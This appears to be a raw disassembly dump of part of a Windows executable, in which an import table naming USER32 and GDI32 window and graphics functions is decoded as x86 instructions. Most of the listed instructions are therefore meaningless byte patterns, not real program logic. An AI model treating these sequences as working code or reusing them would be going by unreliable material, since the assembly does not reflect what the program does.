  428c27:	add    DWORD PTR [ecx],0x65536e49
  428c2d:	outs   dx,BYTE PTR ds:[esi]
  428c2e:	fs dec ebp
  428c30:	gs jae 0x428ca6
  428c33:	popa   
  428c34:	addr16 gs inc ebp
  428c37:	js     0x428c39
  428c39:	ins    DWORD PTR es:[edi],dx
  428c3a:	add    DWORD PTR [edi+0x65],eax
  428c3d:	je     0x428c96
  428c3f:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  428c46:	outs   dx,BYTE PTR ds:[esi]
  428c47:	addr16 push edi
  428c49:	add    BYTE PTR [eax],al
  428c4b:	jle    0x428c4e
  428c4d:	dec    eax
  428c4e:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  428c56:	jne    0x428ca1
  428c58:	je     0x428cbf
  428c5a:	ins    DWORD PTR es:[edi],dx
  428c5b:	add    BYTE PTR [eax],al
  428c5d:	xor    DWORD PTR [eax],eax
  428c5f:	inc    ebx
  428c60:	push   0x72507261
  428c65:	gs jbe 0x428cbf
  428c68:	add    ah,ah
  428c6a:	add    BYTE PTR [esi+0x69],al
  428c6d:	outs   dx,BYTE PTR ds:[esi]
  428c6e:	fs push edi
  428c70:	imul   ebp,DWORD PTR [esi+0x64],0x57776f
  428c77:	sub    al,BYTE PTR [edx]
  428c79:	push   ebx
  428c7a:	outs   dx,BYTE PTR gs:[esi]
  428c7c:	fs dec ebp
  428c7e:	gs jae 0x428cf4
  428c81:	popa   
  428c82:	addr16 gs push esp
  428c85:	imul   ebp,DWORD PTR [ebp+0x65],0x5774756f
  428c8c:	add    BYTE PTR [ebx],al
  428c8e:	add    dl,BYTE PTR [edx+0x65]
  428c91:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428c99:	popa   
  428c9a:	jae    0x428d0f
  428c9c:	inc    ebp
  428c9d:	js     0x428ce0
  428c9f:	add    BYTE PTR [eax],al
  428ca1:	xchg   esi,eax
  428ca2:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428ca6:	outs   dx,BYTE PTR ds:[esi]
  428ca7:	jae    0x428d15
  428ca9:	popa   
  428caa:	je     0x428d11
  428cac:	dec    ebp
  428cad:	gs jae 0x428d23
  428cb0:	popa   
  428cb1:	add    BYTE PTR gs:[bx+si],al
  428cb5:	add    BYTE PTR [edx],0x53
  428cb8:	push   0x6957776f
  428cbd:	outs   dx,BYTE PTR ds:[esi]
  428cbe:	outs   dx,DWORD PTR fs:[esi]
  428cc0:	ja     0x428d03
  428cc2:	jae    0x428d3d
  428cc4:	outs   dx,BYTE PTR ds:[esi]
  428cc5:	arpl   WORD PTR [eax],ax
  428cc7:	mov    BYTE PTR [eax],0x45
  428cca:	outs   dx,BYTE PTR ds:[esi]
  428ccb:	fs push esp
  428ccd:	popa   
  428cce:	jae    0x428d3b
  428cd0:	add    bl,dh
  428cd2:	add    DWORD PTR [eax+0x6f],edx
  428cd5:	jae    0x428d4b
  428cd7:	push   ecx
  428cd8:	jne    0x428d43
  428cda:	je     0x428d29
  428cdc:	gs jae 0x428d52
  428cdf:	popa   
  428ce0:	add    BYTE PTR gs:[bp+si+0x1],bl
  428ce5:	inc    edi
  428ce6:	gs je  0x428d3c
  428ce9:	jns    0x428d5e
  428ceb:	inc    ebx
  428cec:	outs   dx,DWORD PTR ds:[esi]
  428ced:	ins    BYTE PTR es:[edi],dx
  428cee:	outs   dx,DWORD PTR ds:[esi]
  428cef:	jb     0x428d33
  428cf1:	jb     0x428d68
  428cf3:	jae    0x428d5d
  428cf5:	add    BYTE PTR [eax],al
  428cf7:	or     eax,DWORD PTR [eax]
  428cf9:	inc    ecx
  428cfa:	je     0x428d70
  428cfc:	popa   
  428cfd:	arpl   WORD PTR [eax+0x54],bp
  428d00:	push   0x64616572
  428d05:	dec    ecx
  428d06:	outs   dx,BYTE PTR ds:[esi]
  428d07:	jo     0x428d7e
  428d09:	je     0x428d0b
  428d0b:	adc    BYTE PTR [ecx],al
  428d0d:	inc    edi
  428d0e:	gs je  0x428d55
  428d11:	ins    BYTE PTR es:[edi],dx
  428d12:	addr16 dec ecx
  428d14:	je     0x428d7b
  428d16:	ins    DWORD PTR es:[edi],dx
  428d17:	dec    ecx
  428d18:	outs   dx,BYTE PTR ds:[esi]
  428d19:	je     0x428d1b
  428d1b:	mov    eax,0x61724400
  428d20:	ja     0x428d75
  428d22:	je     0x428d85
  428d24:	je     0x428d8b
  428d26:	push   edi
  428d27:	add    BYTE PTR [eax],al
  428d29:	adc    eax,DWORD PTR [edx]
  428d2b:	push   edx
  428d2c:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  428d35:	outs   dx,BYTE PTR ds:[esi]
  428d36:	outs   dx,DWORD PTR fs:[esi]
  428d38:	ja     0x428d87
  428d3a:	gs jae 0x428db0
  428d3d:	popa   
  428d3e:	addr16 gs push edi
  428d41:	add    BYTE PTR [eax],al
  428d43:	or     al,BYTE PTR [eax]
  428d45:	inc    ecx
  428d46:	jb     0x428dba
  428d48:	popa   
  428d49:	outs   dx,BYTE PTR ds:[esi]
  428d4a:	addr16 gs dec ecx
  428d4d:	arpl   WORD PTR [edi+0x6e],bp
  428d50:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  428d57:	ja     0x428dcc
  428d59:	add    BYTE PTR [eax],al
  428d5b:	jnp    0x428d5f
  428d5d:	push   ebx
  428d5e:	push   0x7543776f
  428d63:	jb     0x428dd8
  428d65:	outs   dx,DWORD PTR ds:[esi]
  428d66:	jb     0x428d68
  428d68:	add    BYTE PTR [eax],ch
  428d6a:	add    BYTE PTR [ebx+0x68],al
  428d6d:	popa   
  428d6e:	jb     0x428dbc
  428d70:	outs   dx,DWORD PTR ds:[esi]
  428d71:	ja     0x428dd8
  428d73:	jb     0x428db7
  428d75:	jne    0x428ddd
  428d77:	push   di
  428d79:	add    BYTE PTR [eax],al
  428d7b:	mov    esi,0x756f6d02
  428d80:	jae    0x428de7
  428d82:	pop    edi
  428d83:	gs jbe 0x428deb
  428d86:	outs   dx,BYTE PTR ds:[esi]
  428d87:	je     0x428d89
  428d89:	mov    bl,0x0
  428d8b:	inc    esp
  428d8c:	jb     0x428def
  428d8e:	ja     0x428dd9
  428d90:	arpl   WORD PTR [edi+0x6e],bp
  428d93:	add    BYTE PTR [eax],al
  428d95:	adc    al,BYTE PTR [edx]
  428d97:	push   edx
  428d98:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  428da1:	outs   dx,BYTE PTR ds:[esi]
  428da2:	outs   dx,DWORD PTR fs:[esi]
  428da4:	ja     0x428df3
  428da6:	gs jae 0x428e1c
  428da9:	popa   
  428daa:	addr16 gs inc ecx
  428dad:	add    BYTE PTR [eax],al
  428daf:	daa    
  428db0:	add    DWORD PTR [edi+0x65],eax
  428db3:	je     0x428e00
  428db5:	gs jns 0x428e1a
  428db8:	outs   dx,DWORD PTR ds:[esi]
  428db9:	popa   
  428dba:	jb     0x428e20
  428dbc:	push   esp
  428dbd:	jns    0x428e2f
  428dbf:	add    BYTE PTR gs:[edi+0x66654400],cl
  428dc6:	push   edi
  428dc7:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428dce:	outs   dx,DWORD PTR ds:[esi]
  428dcf:	arpl   WORD PTR [edi+0x0],dx
  428dd2:	add    BYTE PTR [eax+0x536e4901],al
  428dd8:	outs   dx,BYTE PTR gs:[esi]
  428dda:	fs dec ebp
  428ddc:	gs jae 0x428e52
  428ddf:	popa   
  428de0:	add    BYTE PTR gs:[bp+di],dh
  428de4:	add    DWORD PTR [edi+0x65],eax
  428de7:	je     0x428e36
  428de9:	outs   dx,BYTE PTR gs:[esi]
  428deb:	jne    0x428e36
  428ded:	je     0x428e54
  428def:	ins    DWORD PTR es:[edi],dx
  428df0:	dec    ecx
  428df1:	inc    esp
  428df2:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  428df9:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x73490190
  428e01:	inc    ebx
  428e02:	push   0x6f4c7261
  428e07:	ja     0x428e6e
  428e09:	jb     0x428e4c
  428e0b:	add    BYTE PTR [eax],al
  428e0d:	jmp    0x74a7d512
  428e12:	inc    ecx
  428e13:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428e17:	gs push edi
  428e19:	imul   ebp,DWORD PTR [esi+0x64],0x3a00776f
  428e20:	add    dl,BYTE PTR [ebx+0x65]
  428e23:	je     0x428e68
  428e25:	jne    0x428e99
  428e27:	jae    0x428e98
  428e29:	jb     0x428e7b
  428e2b:	outs   dx,DWORD PTR ds:[esi]
  428e2c:	jae    0x428e2e
  428e2e:	add    BYTE PTR ds:0x74654701,dl
  428e34:	inc    esi
  428e35:	outs   dx,DWORD PTR ds:[esi]
  428e36:	jb     0x428e9d
  428e38:	addr16 jb 0x428eaa
  428e3b:	jne    0x428eab
  428e3d:	fs push edi
  428e3f:	imul   ebp,DWORD PTR [esi+0x64],0x2300776f
  428e46:	add    DWORD PTR [edi+0x65],eax
  428e49:	je     0x428e96
  428e4b:	gs jns 0x428eb0
  428e4e:	outs   dx,DWORD PTR ds:[esi]
  428e4f:	popa   
  428e50:	jb     0x428eb6
  428e52:	dec    esp
  428e53:	popa   
  428e54:	jns    0x428ec5
  428e56:	jne    0x428ecc
  428e58:	dec    esp
  428e59:	imul   esi,DWORD PTR [ebx+0x74],0x43006300
  428e60:	jb     0x428ec7
  428e62:	popa   
  428e63:	je     0x428eca
  428e65:	push   edi
  428e66:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428e6d:	push   edi
  428e6e:	add    BYTE PTR [edx+0x766e4901],cl
  428e74:	popa   
  428e75:	ins    BYTE PTR es:[edi],dx
  428e76:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  428e7e:	add    BYTE PTR [eax],bh
  428e80:	add    BYTE PTR [ebx+0x68],al
  428e83:	popa   
  428e84:	jb     0x428edb
  428e86:	jo     0x428ef8
  428e88:	gs jb  0x428ecd
  428e8b:	jne    0x428ef3
  428e8d:	push   di
  428e8f:	add    BYTE PTR [eax],al
  428e91:	mov    al,BYTE PTR [edx]
  428e93:	push   esp
  428e94:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  428e9c:	ja     0x428f11
  428e9e:	add    dh,dh
  428ea0:	add    BYTE PTR [edi+0x65],al
  428ea3:	je     0x428ee8
  428ea5:	ins    BYTE PTR es:[edi],dx
  428ea6:	popa   
  428ea7:	jae    0x428f1c
  428ea9:	dec    ecx
  428eaa:	outs   dx,BYTE PTR ds:[esi]
  428eab:	outs   dx,WORD PTR ds:[esi]
  428ead:	inc    ebp
  428eae:	js     0x428f07
  428eb0:	add    BYTE PTR [esi+0x736e4901],al
  428eb6:	gs jb  0x428f2d
  428eb9:	dec    ebp
  428eba:	outs   dx,BYTE PTR gs:[esi]
  428ebc:	jne    0x428f15
  428ebe:	add    BYTE PTR [eax],bh
  428ec0:	add    DWORD PTR [edi+0x65],eax
  428ec3:	je     0x428f12
  428ec5:	outs   dx,BYTE PTR gs:[esi]
  428ec7:	jne    0x428f1c
  428ec9:	je     0x428f3d
  428ecb:	imul   ebp,DWORD PTR [esi+0x67],0x11000041
  428ed2:	add    DWORD PTR [edi+0x65],eax
  428ed5:	je     0x428f1b
  428ed7:	ins    BYTE PTR es:[edi],dx
  428ed8:	addr16 dec ecx
  428eda:	je     0x428f41
  428edc:	ins    DWORD PTR es:[edi],dx
  428edd:	push   esp
  428ede:	gs js  0x428f55
  428ee1:	inc    ecx
  428ee2:	add    BYTE PTR [eax+0x44734901],bl
  428ee8:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  428eef:	jae    0x428f64
  428ef1:	popa   
  428ef2:	addr16 gs push edi
  428ef5:	add    BYTE PTR [eax],al
  428ef7:	mov    al,ds:0x73694400
  428efc:	jo     0x428f5f
  428efe:	je     0x428f63
  428f00:	push   0x7373654d
  428f05:	popa   
  428f06:	addr16 gs push edi
  428f09:	add    BYTE PTR [eax],al
  428f0b:	js     0x428f0e
  428f0d:	inc    edi
  428f0e:	gs je  0x428f68
  428f11:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428f18:	js     0x428f8e
  428f1a:	push   edi
  428f1b:	add    BYTE PTR [eax],al
  428f1d:	sub    eax,0x6e655302
  428f22:	fs dec esi
  428f24:	outs   dx,DWORD PTR ds:[esi]
  428f25:	je     0x428f90
  428f27:	data16 jns 0x428f77
  428f2a:	gs jae 0x428fa0
  428f2d:	popa   
  428f2e:	addr16 gs push edi
  428f31:	add    BYTE PTR [eax],al
  428f33:	and    BYTE PTR [edx],al
  428f35:	push   ebx
  428f36:	arpl   WORD PTR [edx+0x6f],si
  428f39:	ins    BYTE PTR es:[edi],dx
  428f3a:	ins    BYTE PTR es:[edi],dx
  428f3b:	push   edi
  428f3c:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428f43:	add    BYTE PTR [eax],al
  428f45:	add    WORD PTR [edi+0x65],ax
  428f49:	je     0x428fa0
  428f4b:	jae    0x428fb2
  428f4d:	jb     0x428f9e
  428f4f:	bound  ebp,QWORD PTR [edx+0x65]
  428f52:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428f56:	outs   dx,WORD PTR ds:[esi]
  428f58:	jb     0x428fc7
  428f5a:	popa   
  428f5b:	je     0x428fc6
  428f5d:	outs   dx,DWORD PTR ds:[esi]
  428f5e:	outs   dx,BYTE PTR ds:[esi]
  428f5f:	push   edi
  428f60:	add    ch,dh
  428f62:	add    DWORD PTR [eax+0x6f],edx
  428f65:	jae    0x428fdb
  428f67:	push   esp
  428f68:	push   0x64616572
  428f6d:	dec    ebp
  428f6e:	gs jae 0x428fe4
  428f71:	popa   
  428f72:	addr16 gs push edi
  428f75:	add    BYTE PTR [eax],al
  428f77:	mov    eax,DWORD PTR [ecx]
  428f79:	dec    ecx
  428f7a:	outs   dx,BYTE PTR ds:[esi]
  428f7b:	jbe    0x428fe2
  428f7d:	jb     0x428ff3
  428f7f:	push   edx
  428f80:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428f85:	xchg   edi,eax
  428f86:	add    DWORD PTR [ecx+0x73],ecx
  428f89:	inc    esp
  428f8a:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  428f91:	jae    0x429006
  428f93:	popa   
  428f94:	addr16 gs inc ecx
  428f97:	add    BYTE PTR [eax],al
  428f99:	mov    ch,0x0
  428f9b:	inc    esp
  428f9c:	jb     0x428fff
  428f9e:	ja     0x428fed
  428fa0:	outs   dx,BYTE PTR gs:[esi]
  428fa2:	jne    0x428fe6
  428fa4:	popa   
  428fa5:	jb     0x428fa7
  428fa7:	push   ebp
  428fa8:	push   ebx
  428fa9:	inc    ebp
  428faa:	push   edx
  428fab:	xor    esi,DWORD PTR [edx]
  428fad:	cs fs ins BYTE PTR es:[edi],dx
  428fb0:	ins    BYTE PTR es:[edi],dx
  428fb1:	add    BYTE PTR [eax],al
  428fb3:	int3   
  428fb4:	add    DWORD PTR [ebx+0x65],edx
  428fb7:	ins    BYTE PTR es:[edi],dx
  428fb8:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428fbd:	imul   esi,DWORD PTR [eax+0x52],0x88006e67
  428fc4:	add    BYTE PTR [ebx+0x72],al
  428fc7:	gs popa 
  428fc9:	je     0x429030
  428fcb:	inc    edx
  428fcc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428fd4:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428fdb:	rol    BYTE PTR [eax],0x45
  428fde:	outs   dx,BYTE PTR ds:[esi]
  428fdf:	fs push eax
  428fe1:	popa   
  428fe2:	je     0x42904c
  428fe4:	add    dh,cl
  428fe6:	add    DWORD PTR [ebx+0x65],edx
  428fe9:	ins    BYTE PTR es:[edi],dx
  428fea:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428fef:	push   0x65
  428ff1:	arpl   WORD PTR [eax+eax*1+0x0],si
  428ff5:	fiadd  WORD PTR [ecx]
  428ff7:	push   ebx
  428ff8:	gs je  0x42903f
  428ffb:	dec    ecx
  428ffc:	inc    edx
  428ffd:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  429005:	imul   esp,DWORD PTR [ebx+0x65],0x43009e00
  42900c:	jb     0x429073
  42900e:	popa   
  42900f:	je     0x429076
  429011:	inc    esi
  429012:	outs   dx,DWORD PTR ds:[esi]
  429013:	outs   dx,BYTE PTR ds:[esi]
  429014:	je     0x42906d
  429016:	add    dh,dh
  429018:	add    DWORD PTR [ebx+0x65],edx
  42901b:	je     0x429070
  42901d:	je     0x429091
  42901f:	gs je  0x429085
  429022:	push   0x4d746c42
  429027:	outs   dx,DWORD PTR ds:[esi]
  429028:	fs add BYTE PTR gs:[eax+0x65724300],dh
  429030:	popa   
  429031:	je     0x429098
  429033:	push   ebx
  429034:	outs   dx,DWORD PTR ds:[esi]
  429035:	ins    BYTE PTR es:[edi],dx
  429036:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  42903e:	add    bh,cl
  429040:	add    DWORD PTR [ebx+0x65],edx
  429043:	ins    BYTE PTR es:[edi],dx
  429044:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  429049:	ins    BYTE PTR es:[edi],dx
  42904a:	gs je  0x4290c1
  42904d:	add    BYTE PTR gs:[edx+0x63655201],bh
  429054:	je     0x4290ac
  429056:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  42905d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42905e:	add    DWORD PTR [eax+0x61],edx
  429061:	je     0x4290a5
  429063:	ins    BYTE PTR es:[edi],dx
  429064:	je     0x429066
  429066:	add    BYTE PTR [ebx+0x65724300],dl
  42906c:	popa   
  42906d:	je     0x4290d4
  42906f:	inc    esp
  429070:	dec    ecx
  429071:	inc    edx
  429072:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xdc000070
  42907a:	add    DWORD PTR [ebx+0x65],edx
  42907d:	je     0x4290c3
  42907f:	dec    ecx
  429080:	inc    edx
  429081:	inc    ebx
  429082:	outs   dx,DWORD PTR ds:[esi]
  429083:	ins    BYTE PTR es:[edi],dx
  429084:	outs   dx,DWORD PTR ds:[esi]
  429085:	jb     0x4290db
  429087:	popa   
  429088:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  42908c:	add    BYTE PTR [eax+0x1],al
  42908f:	inc    edi
  429090:	gs je  0x4290d7
  429093:	dec    ecx
  429094:	inc    edx
  429095:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655201c1
  42909d:	ins    DWORD PTR es:[edi],dx
  42909e:	outs   dx,DWORD PTR ds:[esi]
  42909f:	jbe    0x429106
  4290a1:	inc    esi
  4290a2:	outs   dx,DWORD PTR ds:[esi]
  4290a3:	outs   dx,BYTE PTR ds:[esi]
  4290a4:	je     0x4290f8
  4290a6:	gs jae 0x429118
  4290a9:	jne    0x42911d
  4290ab:	arpl   WORD PTR [ebp+0x57],sp
  4290ae:	add    ah,bh
  4290b0:	add    DWORD PTR [ebx+0x65],edx
  4290b3:	je     0x42910b
  4290b5:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4290bc:	inc    ebp
  4290bd:	js     0x429133
  4290bf:	inc    ebp
  4290c0:	js     0x4290c2
  4290c2:	add    BYTE PTR [esi],dh
  4290c4:	add    DWORD PTR [edi+0x65],eax
  4290c7:	je     0x42910c
  4290c9:	ins    BYTE PTR es:[edi],dx
  4290ca:	imul   esi,DWORD PTR [eax+0x42],0x786f
  4290d1:	cmp    al,BYTE PTR [ecx]
  4290d3:	inc    edi
  4290d4:	gs je  0x42911a
  4290d7:	jne    0x42914b
  4290d9:	jb     0x429140
  4290db:	outs   dx,BYTE PTR ds:[esi]
  4290dc:	je     0x42912d
  4290de:	bound  ebp,QWORD PTR [edx+0x65]
  4290e1:	arpl   WORD PTR [eax+eax*1+0x0],si
  4290e5:	xchg   edx,eax
  4290e6:	add    BYTE PTR [ebx+0x72],al
  4290e9:	gs popa 
  4290eb:	je     0x429152
  4290ed:	inc    esp
  4290ee:	dec    ecx
  4290ef:	inc    edx
  4290f0:	push   ebx
  4290f1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4290f6:	outs   dx,BYTE PTR ds:[esi]
  4290f7:	add    BYTE PTR [eax],al
  4290f9:	out    0x1,al
  4290fb:	push   ebx
  4290fc:	gs je  0x42914b
  4290ff:	popa   
  429100:	jns    0x429171
  429102:	jne    0x429178
  429104:	add    BYTE PTR ds:0x61745302,al
  42910a:	jb     0x429180
  42910c:	push   eax
  42910d:	popa   
  42910e:	add    BYTE PTR gs:[bx+di+0x4f01],ah
  429114:	data16 data16 jae 0x42917d
  429118:	je     0x429170
  42911a:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  429121:	dec    edi
  429122:	jb     0x42918b
  429124:	inc    ebp
  429125:	js     0x429127
  429127:	add    DWORD PTR [bx+0x65],eax
  42912b:	je     0x42917c
  42912d:	bound  ebp,QWORD PTR [edx+0x65]
  429130:	arpl   WORD PTR [ecx+eax*2+0x0],si
  429134:	add    BYTE PTR [edx+eax*1],dl
  429137:	push   edi
  429138:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  429140:	add    BYTE PTR [ecx],al
  429142:	add    dl,BYTE PTR [ebx+0x65]
  429145:	je     0x42919e
  429147:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  42914e:	addr16 inc ebp
  429150:	js     0x429152
  429152:	add    BYTE PTR [edx+0x65724300],bl
  429158:	popa   
  429159:	je     0x4291c0
  42915b:	inc    esi
  42915c:	outs   dx,DWORD PTR ds:[esi]
  42915d:	outs   dx,BYTE PTR ds:[esi]
  42915e:	je     0x4291a9
  429160:	outs   dx,BYTE PTR ds:[esi]
  429161:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  429169:	mov    DWORD PTR [eax],0x6d756e45
  42916f:	inc    esi
  429170:	outs   dx,DWORD PTR ds:[esi]
  429171:	outs   dx,BYTE PTR ds:[esi]
  429172:	je     0x4291e7
  429174:	push   edi
  429175:	add    BYTE PTR [eax],al
  429177:	pop    es
  429178:	add    BYTE PTR [ecx+0x64],al
  42917b:	fs inc esi
  42917d:	outs   dx,DWORD PTR ds:[esi]
  42917e:	outs   dx,BYTE PTR ds:[esi]
  42917f:	je     0x4291d3
  429181:	gs jae 0x4291f3
  429184:	jne    0x4291f8
  429186:	arpl   WORD PTR [ebp+0x57],sp
  429189:	add    BYTE PTR [eax],al
  42918b:	xlat   BYTE PTR ds:[ebx]
  42918c:	add    DWORD PTR [ebx+0x65],edx
  42918f:	je     0x4291d3
  429191:	jb     0x429208
  429193:	jae    0x4291fd
  429195:	dec    edi
  429196:	jb     0x4291ff
  429198:	inc    ebp
  429199:	js     0x42919b
  42919b:	mov    ecx,0x63655201
  4291a0:	je     0x4291eb
  4291a2:	outs   dx,BYTE PTR ds:[esi]
  4291a3:	push   edx
  4291a4:	imul   ebp,DWORD PTR gs:[bx+0x6e],0x1e80000
  4291ad:	push   ebx
  4291ae:	gs je  0x4291fe
  4291b1:	popa   
  4291b2:	jo     0x429201
  4291b4:	outs   dx,DWORD PTR ds:[esi]
  4291b5:	fs add BYTE PTR gs:[eax],al
  4291b9:	mov    cl,0x0
  4291bb:	inc    esp
  4291bc:	push   eax
  4291bd:	je     0x42922e
  4291bf:	dec    esp
  4291c0:	push   eax
  4291c1:	add    BYTE PTR [eax],al
  4291c3:	mov    esi,0x646e4500
  4291c8:	inc    esp
  4291c9:	outs   dx,DWORD PTR ds:[esi]
  4291ca:	arpl   WORD PTR [eax],ax
  4291cc:	add    BYTE PTR [edx+0x65724300],ah
  4291d2:	popa   
  4291d3:	je     0x42923a
  4291d5:	dec    ecx
  4291d6:	inc    ebx
  4291d7:	push   edi
  4291d8:	add    BYTE PTR [ebp+0x0],dh
  4291db:	inc    edx
  4291dc:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4291e5:	xchg   ecx,eax
  4291e6:	add    DWORD PTR [edi+0x65],eax
  4291e9:	je     0x429242
  4291eb:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4291f2:	addr16 inc ebp
  4291f4:	js     0x4291f6
  4291f6:	add    BYTE PTR [esi+0x65724300],ah
  4291fc:	popa   
  4291fd:	je     0x429264
  4291ff:	push   eax
  429200:	popa   
  429201:	je     0x429277
  429203:	gs jb  0x429274
  429206:	inc    edx
  429207:	jb     0x42927e
  429209:	jae    0x429273
  42920b:	add    BYTE PTR [eax],al
  42920d:	xchg   esp,eax
  42920e:	add    BYTE PTR [ebx+0x72],al
  429211:	gs popa 
  429213:	je     0x42927a
  429215:	inc    esp
  429216:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  42921d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  429221:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xab0070
  429229:	inc    ebx
  42922a:	jb     0x429291
  42922c:	popa   
  42922d:	je     0x429294
  42922f:	push   edx
  429230:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  429235:	outs   dx,BYTE PTR ds:[esi]
  429236:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  42923d:	jo     0x4292b2
  42923f:	add    BYTE PTR gs:[ebp+0x65724300],ah
  429246:	popa   
  429247:	je     0x4292ae
  429249:	push   eax
  42924a:	popa   
  42924b:	ins    BYTE PTR es:[edi],dx
  42924c:	gs je  0x4292c3
  42924f:	add    BYTE PTR gs:[edi],cl
  429252:	add    dl,BYTE PTR [ebp+0x6e]
  429255:	jb     0x4292bc
  429257:	popa   
  429258:	ins    BYTE PTR es:[edi],dx
  429259:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  429260:	arpl   WORD PTR [eax+eax*1-0x2c],si
  429264:	add    BYTE PTR [ebp+0x78],al
  429267:	je     0x4292bd
  429269:	gs js  0x4292e0
  42926c:	dec    edi
  42926d:	jne    0x4292e3
  42926f:	inc    ecx
  429270:	add    BYTE PTR [ecx+0x1],bh
  429273:	inc    edi
  429274:	gs je  0x4292ca
  429277:	jns    0x4292ec
  429279:	je     0x4292e0
  42927b:	ins    DWORD PTR es:[edi],dx
  42927c:	push   eax
  42927d:	popa   
  42927e:	ins    BYTE PTR es:[edi],dx
  42927f:	gs je  0x4292f6
  429282:	gs inc ebp
  429284:	outs   dx,BYTE PTR ds:[esi]
  429285:	je     0x4292f9
  429287:	imul   esp,DWORD PTR [ebp+0x73],0x5201c600
  42928e:	outs   dx,DWORD PTR ds:[esi]
  42928f:	jne    0x4292ff
  429291:	fs push edx
  429293:	arpl   WORD PTR gs:[eax+eax*1+0x47],si
  429298:	inc    esp
  429299:	dec    ecx
  42929a:	xor    esi,DWORD PTR [edx]
  42929c:	cs fs ins BYTE PTR es:[edi],dx
  42929f:	ins    BYTE PTR es:[edi],dx
  4292a0:	add    BYTE PTR [eax+0x6b],ah
  4292a3:	adc    BYTE PTR [eax],al
  4292a5:	mov    dl,0x30
  4292a7:	adc    BYTE PTR [eax],al
  4292a9:	jp     0x429324
  4292ab:	adc    BYTE PTR [eax],al
  4292ad:	adc    al,0x2b
  4292af:	adc    BYTE PTR [eax],al
  4292b1:	in     eax,0x2f
  4292b3:	adc    BYTE PTR [eax],al
  4292b5:	inc    edi
  4292b6:	pop    esp
  4292b7:	adc    BYTE PTR [eax],al
  4292b9:	xchg   edx,eax
  4292ba:	dec    edi
  4292bb:	adc    BYTE PTR [eax],al
  4292bd:	xchg   ecx,eax
  4292be:	push   ecx
  4292bf:	adc    BYTE PTR [eax],al
  4292c1:	or     dl,BYTE PTR [bx+si]
  4292c4:	add    BYTE PTR [ebx+0x70],ah
  4292c7:	adc    BYTE PTR [eax],al
  4292c9:	xchg   esi,eax
  4292ca:	adc    BYTE PTR fs:[eax],al
  4292cd:	mov    dh,0x69
  4292cf:	adc    BYTE PTR [eax],al
  4292d1:	cdq    
  4292d2:	js     0x4292e4
  4292d4:	add    dl,bl
  4292d6:	data16 adc BYTE PTR [eax],al
  4292d9:	inc    edi
  4292da:	sub    dl,BYTE PTR [eax]
  4292dc:	add    BYTE PTR [eax+ebx*2-0x6d5efff0],ah
  4292e3:	inc    edx
  4292e4:	add    BYTE PTR [ebp-0x56ffbd6e],ah
  4292ea:	xchg   edx,eax
  4292eb:	inc    edx
  4292ec:	add    BYTE PTR [ebp-0x4effbd6e],ch
  4292f2:	xchg   edx,eax
  4292f3:	inc    edx
  4292f4:	add    BYTE PTR [ebp-0x46ffbd6e],dh
  4292fa:	xchg   edx,eax
  4292fb:	inc    edx
  4292fc:	add    BYTE PTR [ebp+0x4d004292],bh
  429302:	push   ebp
  429303:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  429309:	mov    esp,ebp
  42930b:	or     ah,dh
  42930d:	dec    ebp
  42930e:	add    bh,al
  429310:	add    BYTE PTR [eax],cl
  429312:	add    BYTE PTR [eax],al
  429314:	mov    DWORD PTR [eax],0x40f44545
  42931a:	xor    eax,0x9c8b8500
  42931f:	hlt    
  429320:	clc    
  429321:	retf   
  429322:	(bad)  
  429323:	enter  0x4d45,0xbc
  429327:	mov    esi,DWORD PTR [esp+esi*8]
  42932a:	test   ebx,ecx
  42932c:	pushf  
  42932d:	enter  0x4df8,0x8b
  429331:	mov    DWORD PTR [ebp-0x20],0x890208
  429338:	inc    ebp
  429339:	inc    ebp
  42933a:	cld    
  42933b:	xor    cl,BYTE PTR [ebx-0xb38b300]
  429341:	or     BYTE PTR [ebx+0x0],dl
  429344:	mov    ebx,0x8bd5700
  429349:	call   DWORD PTR [ecx-0x1]
